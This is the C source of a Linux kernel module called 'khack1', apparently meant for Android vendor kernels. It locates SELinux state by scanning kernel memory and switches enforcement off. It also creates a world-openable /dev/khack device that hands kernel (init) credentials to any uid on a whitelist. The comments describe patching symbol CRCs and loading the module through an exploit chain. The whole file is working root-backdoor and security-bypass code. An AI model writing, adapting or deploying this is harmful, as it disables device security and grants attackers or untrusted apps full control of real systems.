// SPDX-License-Identifier: GPL-2.0
/* khack1 - stable root provider for 4.19 vendor kernels (MODVERSIONS-safe).
 *
 *   1. locate struct selinux_state by scanning the image and clear enforcing
 *   2. /dev/khack: open() gives the caller init_cred, but only if its uid is
 *      listed in /data/local/tmp/dfroot_allow
 *
 * Only module_layout/printk/misc_register/misc_deregister/__symbol_get are
 * imported, and their vendor CRCs are patched in at packaging time.
 */
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/miscdevice.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/errno.h>
#include <linux/mm.h>
#include <linux/string.h>
#include <linux/types.h>
#include <linux/sched.h>
#include <linux/cred.h>
#include <linux/uaccess.h>

typedef void *(*commit_fn)(void *);
typedef void *(*prep_fn)(void *);
typedef unsigned long (*copy_fn)(void *to, const void *from, unsigned long n);

static commit_fn p_commit_creds;
static prep_fn   p_prepare_kernel_cred;

/* ---- whitelist ------------------------------------------------------ *
 * No file IO: the manager rewrites this array inside the module image right
 * before handing it to the chain, so kernel context never has to open
 * anything (that is what used to fail with untrusted_app creds).
 * The symbol name survives in .symtab, so the app can find it by parsing
 * the ELF instead of hardcoding an offset.
 */
#define KMAX_ALLOW 8
static int allow_uids[KMAX_ALLOW] = { -1, -1, -1, -1, -1, -1, -1, -1 };
static int allow_cnt = KMAX_ALLOW;
module_param_array(allow_uids, int, &allow_cnt, 0444);

static bool uid_allowed(u32 uid)
{
	int i;

	if (allow_cnt <= 0)
		return false;
	for (i = 0; i < allow_cnt && i < KMAX_ALLOW; i++)
		if ((u32)allow_uids[i] == uid)
			return true;
	return false;
}

/* ---- locate struct selinux_state without kallsyms_lookup_name ---- */
static int khack_clear_enforcing(void)
{
	copy_fn pkr = (copy_fn)__symbol_get("probe_kernel_read");
	unsigned long anchor = (unsigned long)__symbol_get("printk");
	unsigned long lo, hi, a, hit = 0;
	static u8 buf[4096];
	int found = 0;

	if (!pkr || !anchor)
		return -EINVAL;

	anchor &= ~0xFFFUL;
	lo = anchor - 0x800000UL;
	hi = anchor + 0x4000000UL;

	for (a = lo; a < hi; a += sizeof(buf)) {
		unsigned int i;

		if (pkr(buf, (void *)a, sizeof(buf)))
			continue;

		for (i = 0; i + 32 <= sizeof(buf); i++) {
			u8 *b = buf + i;
			u64 avc, ss;
			int j, ok = 1;

			if (b[0] || b[1] != 1 || b[2] || b[3] != 1)
				continue;
			if ((a + i) & 7)
				continue;
			for (j = 4; j < 16; j++)
				if (b[j] > 1) { ok = 0; break; }
			if (!ok)
				continue;

			memcpy(&avc, b + 16, 8);
			memcpy(&ss, b + 24, 8);
			if (avc & 7 || ss & 7)
				continue;
			if (avc < lo || avc >= hi || ss < lo || ss >= hi)
				continue;

			found++;
			hit = a + i;
		}
	}

	if (found != 1)
		return -ENOENT;

	*(u8 *)(hit + 1) = 0;
	return 0;
}

/* open("/dev/khack") -> whitelisted caller becomes init_cred */
static int khack_open(struct inode *inode, struct file *file)
{
	void *cred;

	if (!uid_allowed(__kuid_val(current_uid())))
		return -EACCES;

	if (!p_prepare_kernel_cred || !p_commit_creds)
		return -ENOENT;

	cred = p_prepare_kernel_cred(NULL);
	if (!cred)
		return -ENOMEM;

	p_commit_creds(cred);
	return 0;
}

static const struct file_operations khack_fops = {
	.owner = THIS_MODULE,
	.open  = khack_open,
};

static struct miscdevice khack_dev = {
	.minor = MISC_DYNAMIC_MINOR,
	.name  = "khack",
	.fops  = &khack_fops,
	.mode  = 0666,
};

static int __init khack_init(void)
{
	int ret;

	p_commit_creds        = (commit_fn)__symbol_get("commit_creds");
	p_prepare_kernel_cred = (prep_fn)__symbol_get("prepare_kernel_cred");
	if (!p_commit_creds || !p_prepare_kernel_cred)
		return -ENOENT;

	khack_clear_enforcing();

	ret = misc_register(&khack_dev);
	if (ret)
		return ret;

	pr_info("khack1: ready\n");
	return 0;
}

static void __exit khack_exit(void)
{
	misc_deregister(&khack_dev);
}

module_init(khack_init);
module_exit(khack_exit);

MODULE_LICENSE("GPL");
